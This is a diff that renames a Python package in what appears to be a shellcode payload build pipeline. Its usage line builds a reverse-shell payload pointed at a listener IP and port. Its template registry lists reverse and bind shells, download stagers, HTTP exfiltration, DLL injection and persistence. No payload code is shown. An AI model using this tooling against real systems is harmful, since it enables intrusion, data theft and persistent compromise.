@@ -1,7 +1,7 @@
 """Assembly build pipeline: manifest -> generated.asm + generated_contract.md.
 
 Usage:
-    uv run emitera emitera/manifests/revshell.yaml \
+    uv run emitrion emitrion/manifests/revshell.yaml \
         --lhost 192.168.1.116 --lport 9001 --out emitter_out/
 """
 from __future__ import annotations
@@ -17,7 +17,7 @@ import tempfile
 from dataclasses import dataclass
 from datetime import UTC, datetime
 
-from emitera.strings import emit_push, to_dwords
+from emitrion.strings import emit_push, to_dwords
 
 from .api_database import API_DATABASE, MODULE_LOAD_ORDER, STRUCT_DATABASE
 from .api_emitter import emit_module_resolution
@@ -765,26 +765,26 @@ def _validate_badchars(raw: bytes, badchars: set[int]) -> list[str]:
 def _load_template(name: str) -> PayloadTemplate:
     """Load a payload template by short name."""
     registry = {
-        "reverse_shell":  "emitera.payload_templates.reverse_shell.ReverseShellTemplate",
-        "run_command":    "emitera.payload_templates.run_command.RunCommandTemplate",
-        "copy_file":      "emitera.payload_templates.copy_file.CopyFileTemplate",
-        "copy_then_run":  "emitera.payload_templates.copy_then_run.CopyThenRunTemplate",
-        "move_then_run":  "emitera.payload_templates.move_then_run.MoveThenRunTemplate",
-        "tcp_download":   "emitera.payload_templates.tcp_download.TcpDownloadTemplate",
-        "tcp_stager":     "emitera.payload_templates.tcp_stager.TcpStagerTemplate",
-        "bind_shell":     "emitera.payload_templates.bind_shell.BindShellTemplate",
-        "http_download":  "emitera.payload_templates.http_download.HttpDownloadTemplate",
-        "http_exfil":     "emitera.payload_templates.http_exfil.HttpExfilTemplate",
-        "process_replace": "emitera.payload_templates.process_replace.ProcessReplaceTemplate",
-        "service_persist": "emitera.payload_templates.service_persist.ServicePersistTemplate",
-        "dll_inject":      "emitera.payload_templates.dll_inject.DllInjectTemplate",
-        "registry_persist": "emitera.payload_templates.registry_persist.RegistryPersistTemplate",
-        "check_path":      "emitera.payload_templates.check_path.CheckPathTemplate",
-        "get_username":    "emitera.payload_templates.get_username.GetUsernameTemplate",
-        "download_to_userpath": "emitera.payload_templates.download_to_userpath.DownloadToUserpathTemplate",
-        "tcp_download_to_userpath": "emitera.payload_templates.tcp_download_to_userpath.TcpDownloadToUserpathTemplate",
-        "ir_run_command":  "emitera.workflow.reference.IRRunCommandTemplate",
-        "ir_reverse_shell": "emitera.workflow.reference.IRReverseShellTemplate",
+        "reverse_shell":  "emitrion.payload_templates.reverse_shell.ReverseShellTemplate",
+        "run_command":    "emitrion.payload_templates.run_command.RunCommandTemplate",
+        "copy_file":      "emitrion.payload_templates.copy_file.CopyFileTemplate",
+        "copy_then_run":  "emitrion.payload_templates.copy_then_run.CopyThenRunTemplate",
+        "move_then_run":  "emitrion.payload_templates.move_then_run.MoveThenRunTemplate",
+        "tcp_download":   "emitrion.payload_templates.tcp_download.TcpDownloadTemplate",
+        "tcp_stager":     "emitrion.payload_templates.tcp_stager.TcpStagerTemplate",
+        "bind_shell":     "emitrion.payload_templates.bind_shell.BindShellTemplate",
+        "http_download":  "emitrion.payload_templates.http_download.HttpDownloadTemplate",
+        "http_exfil":     "emitrion.payload_templates.http_exfil.HttpExfilTemplate",
+        "process_replace": "emitrion.payload_templates.process_replace.ProcessReplaceTemplate",
+        "service_persist": "emitrion.payload_templates.service_persist.ServicePersistTemplate",
+        "dll_inject":      "emitrion.payload_templates.dll_inject.DllInjectTemplate",
+        "registry_persist": "emitrion.payload_templates.registry_persist.RegistryPersistTemplate",
+        "check_path":      "emitrion.payload_templates.check_path.CheckPathTemplate",
+        "get_username":    "emitrion.payload_templates.get_username.GetUsernameTemplate",
+        "download_to_userpath": "emitrion.payload_templates.download_to_userpath.DownloadToUserpathTemplate",
+        "tcp_download_to_userpath": "emitrion.payload_templates.tcp_download_to_userpath.TcpDownloadToUserpathTemplate",
+        "ir_run_command":  "emitrion.workflow.reference.IRRunCommandTemplate",
+        "ir_reverse_shell": "emitrion.workflow.reference.IRReverseShellTemplate",
     }
     if name not in registry:
         raise ValueError(
@@ -924,7 +924,7 @@ def _merge_template_requirements(
 
     # WorkflowTemplate declares requirements precisely; unknown names
     # are IR-defined locals that need variable slots.
-    from emitera.workflow.reference import WorkflowTemplate
+    from emitrion.workflow.reference import WorkflowTemplate
     auto_add_vars = isinstance(template, WorkflowTemplate)
 
     # Auto-add strings from IR ConstructString declarations
@@ -1119,7 +1119,7 @@ def build(
     extra_structs: list[str] | None = None
     if template is not None:
         manifest = _merge_template_requirements(manifest, template, config)
-        from emitera.workflow.reference import WorkflowTemplate
+        from emitrion.workflow.reference import WorkflowTemplate
         if isinstance(template, WorkflowTemplate):
             extra_structs = list(template.probe_structs().values())
     layout = build_layout(manifest, extra_structs=extra_structs)
